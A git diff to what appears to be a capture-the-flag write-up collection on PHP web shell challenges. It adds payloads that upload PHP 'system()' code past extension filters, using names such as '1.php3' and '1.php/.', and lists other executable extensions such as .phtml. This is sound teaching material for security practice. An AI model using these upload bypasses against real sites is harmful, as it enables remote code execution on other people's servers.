@@ -56,6 +56,8 @@ that ```x``` can help you separate each results.
 ## Shorter shell
 Level: :star::star::star:  
 [Enjoy my writeup on my blog](https://shinmao.github.io/2018/02/20/A-tiny-shell/)  
+In fact, there is a classic solution to such kind of challenge: **Reverse shell**  
+Thanks to @chris-issing provides his payload: 
 
 ## Peasy shell not PHP
 Level: :star:  
@@ -74,6 +76,8 @@ if(preg_match('/.+\.php$/i', $filename)){
     fclose($f);
 }
 ```
+Payload: ```url/?content=<?php system('ls');?>&filename=1.php3```  
+Associated knowledge: ```.php4```,```php5```,```php7```,```pht```,```phtml``` can also work.  
 
 ## Apache2 giv u new Shell
 Level: :star:  
@@ -98,6 +102,7 @@ if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
     fclose($f);
 }
 ```
+Payload: ```url/?content=<?php system('ls');?>&filename=1.php/.```  
 
 ## Destroy chllenge with ur shell?
 Level: :star::star::star:  
@@ -137,4 +142,5 @@ if($_FILES["file"]["error"]>0){
     }
 }
 ```
-```
+Payload: [Enjoy my blog](https://shinmao.github.io/web/2018/04/13/The-Magic-from-0CTF-ezDoor/)  
+![payload](https://github.com/shinmao/shinmao.github.io/blob/master/assets/uploads/2018-04-13/payload.png)
